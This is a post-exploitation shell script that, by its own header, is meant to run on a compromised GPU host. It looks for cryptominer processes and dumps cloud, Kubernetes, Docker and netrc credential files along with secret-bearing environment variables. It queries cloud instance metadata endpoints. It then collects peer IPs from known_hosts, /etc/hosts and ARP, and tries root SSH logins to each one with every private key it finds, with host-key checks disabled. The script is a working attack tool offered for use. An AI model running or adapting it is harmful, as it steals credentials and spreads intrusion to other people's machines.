#!/bin/sh
# UL lan_sweep — run ON a compromised GPU host: harvest creds, map peers, test SSH fanout.
set -x
echo "== host =="; hostname; id; uptime | head -1
echo "== gpu =="; nvidia-smi -L 2>&1 | head -10
echo "== miners =="; ps -eo pid,etime,args 2>/dev/null | grep -Ei "wildrig|krig|peak|xmrig" | grep -v grep | head -12
echo "== net =="; ip -4 route 2>/dev/null | head -8; ip -4 addr 2>/dev/null | grep -E "inet " | head -6
echo "== arp =="; (arp -an 2>/dev/null || ip neigh 2>/dev/null) | head -30
echo "== hosts =="; cat /etc/hosts | head -20
echo "== known_hosts =="; cut -d' ' -f1 /root/.ssh/known_hosts 2>/dev/null | tr ',' '\n' | sort -u | head -40
echo "== keys =="; ls -la /root/.ssh/ 2>/dev/null | head -15
echo "== k8s =="; ls -la /etc/kubernetes 2>/dev/null | head -6; ls /root/.kube 2>/dev/null
echo "== cloud creds =="
for f in /root/.aws/credentials /root/.config/gcloud/application_default_credentials.json /root/.aliyun/config.json /root/.config/doctl/config.yaml /root/.config/rclone/rclone.conf /root/.netrc /root/.docker/config.json /etc/kubernetes/admin.conf; do
  [ -f "$f" ] && echo "--- $f" && head -c 800 "$f" && echo
done
echo "== env =="; env | grep -iE "aws|azure|gcp|google|token|key|secret|proxy" | head -20
echo "== imds =="
curl -s -m 4 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/name" ; echo
curl -s -m 4 "http://169.254.169.254/latest/meta-data/instance-id"; echo
curl -s -m 4 "http://100.100.100.200/latest/meta-data/instance-id"; echo
echo "== peer ssh test =="
PEERS=$( (cut -d' ' -f1 /root/.ssh/known_hosts 2>/dev/null | tr ',' '\n'; cat /etc/hosts | awk '{print $1}'; (arp -an 2>/dev/null || ip neigh 2>/dev/null) | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}") | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}$" | sort -u | head -40 )
echo "peers: $PEERS"
for p in $PEERS; do
  for k in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/*.pem /root/.ssh/id_*; do
    [ -f "$k" ] || continue
    if timeout 6 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o IdentitiesOnly=yes root@"$p" 'hostname; nvidia-smi -L 2>/dev/null | wc -l' 2>/dev/null | head -2; then
      echo "PEER_OK $p $k"
      break
    fi
  done
done
echo "== done =="
